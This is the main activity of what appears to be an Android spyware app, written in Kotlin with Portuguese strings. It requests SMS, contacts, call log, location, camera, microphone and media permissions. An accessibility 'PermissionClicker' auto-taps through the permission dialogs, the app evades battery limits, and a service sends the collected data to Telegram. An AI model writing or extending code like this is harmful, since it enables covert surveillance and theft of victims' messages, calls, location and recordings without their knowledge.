package com.example.monitor

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.android.material.button.MaterialButton

class MainActivity : AppCompatActivity() {

    private val pedido = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { resultado ->
        val faltando = resultado.filterValues { !it }.keys
        if (faltando.isNotEmpty()) {
            val negado = faltando.first()
            if (!shouldShowRequestPermissionRationale(negado)) {
                abrirConfigDoApp()
                return@registerForActivityResult
            }
        }
        prosseguir()
    }

    private lateinit var progresso: ProgressBar
    private lateinit var resumo: TextView
    private lateinit var detalhes: TextView
    private lateinit var painel: LinearLayout
    private lateinit var btnAtivar: MaterialButton

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        progresso = findViewById(R.id.progresso)
        resumo = findViewById(R.id.resumo)
        detalhes = findViewById(R.id.detalhes)
        painel = findViewById(R.id.painel_avancado)
        btnAtivar = findViewById(R.id.btn_ativar)

        btnAtivar.setOnClickListener { fluxo() }
        findViewById<MaterialButton>(R.id.btn_avancado).setOnClickListener {
            painel.visibility = if (painel.visibility == View.VISIBLE) View.GONE else View.VISIBLE
        }
        findViewById<MaterialButton>(R.id.btn_parar).setOnClickListener {
            SyncService.parar(this)
            atualizar()
        }
        findViewById<MaterialButton>(R.id.btn_testar).setOnClickListener {
            Thread { Telegram.send("<b>Teste</b> — comunicação OK") }.start()
        }

        atualizar()
    }

    override fun onResume() {
        super.onResume()
        atualizar()
    }

    private fun fluxo() {
        if (!permissaoBasica()) return
        if (!acessibilidadeLigada()) {
            // o clique automático assume daqui
            PermissionClicker.armar()
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            return
        }
        prosseguir()
    }

    private fun prosseguir() {
        if (!permissaoBasica()) return
        if (!bateriaIgnorada()) {
            PermissionClicker.armar()
            pedirBateria()
            return
        }
        SyncService.iniciar(this)
        atualizar()
    }

    private fun permissaoBasica(): Boolean {
        val faltando = lista().filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (faltando.isNotEmpty()) {
            PermissionClicker.armar()
            pedido.launch(faltando.toTypedArray())
            return false
        }
        return true
    }

    private fun lista(): List<String> {
        val l = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )
        if (Build.VERSION.SDK_INT >= 33) {
            l.add(Manifest.permission.POST_NOTIFICATIONS)
            l.add(Manifest.permission.READ_MEDIA_IMAGES)
            l.add(Manifest.permission.READ_MEDIA_VIDEO)
            l.add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            l.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        return l
    }

    private fun acessibilidadeLigada() = Collector.acessibilidadeAtiva(this) == "sim"

    private fun bateriaIgnorada() = Collector.ignorandoBateria(this)

    private fun pedirBateria() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (pm.isIgnoringBatteryOptimizations(packageName)) return
        startActivity(
            Intent(
                Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                Uri.parse("package:$packageName")
            )
        )
    }

    private fun abrirConfigDoApp() {
        startActivity(
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$packageName"))
        )
    }

    private fun marcar(idDot: Int, idEst: Int, ok: Boolean, texto: String) {
        findViewById<View>(idDot).background?.setTint(
            ContextCompat.getColor(this, if (ok) R.color.verde else R.color.vermelho)
        )
        findViewById<TextView>(idEst).text = texto
    }

    private fun atualizar() {
        val perm = lista().all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
        val ace = acessibilidadeLigada()
        val bat = bateriaIgnorada()
        val serv = SyncService.ativo

        marcar(R.id.dot_permissoes, R.id.est_permissoes, perm, if (perm) "ok" else "pendente")
        marcar(R.id.dot_acessibilidade, R.id.est_acessibilidade, ace, if (ace) "ok" else "pendente")
        marcar(R.id.dot_bateria, R.id.est_bateria, bat, if (bat) "ok" else "pendente")
        marcar(R.id.dot_servico, R.id.est_servico, serv, if (serv) "ativo" else "parado")

        val total = listOf(perm, ace, bat, serv).count { it }
        progresso.progress = total * 25

        when {
            serv -> {
                btnAtivar.text = "Monitor ativo"
                resumo.text = "Tudo pronto. Os dados estão indo para o Telegram."
            }
            total == 3 -> {
                btnAtivar.text = "Iniciar monitoramento"
                resumo.text = "Permissões completas. Só falta iniciar."
            }
            else -> {
                btnAtivar.text = "Ativar tudo"
                resumo.text = "Toque em ativar. O app cuida do resto."
            }
        }

        detalhes.text = buildString {
            append("Token: ${if (Config.configurado()) "sim" else "NÃO"}\n")
            append("Root: ${if (Root.disponivel()) "sim" else "não"}\n")
            append("SDK: ${Build.VERSION.SDK_INT}")
        }
    }
}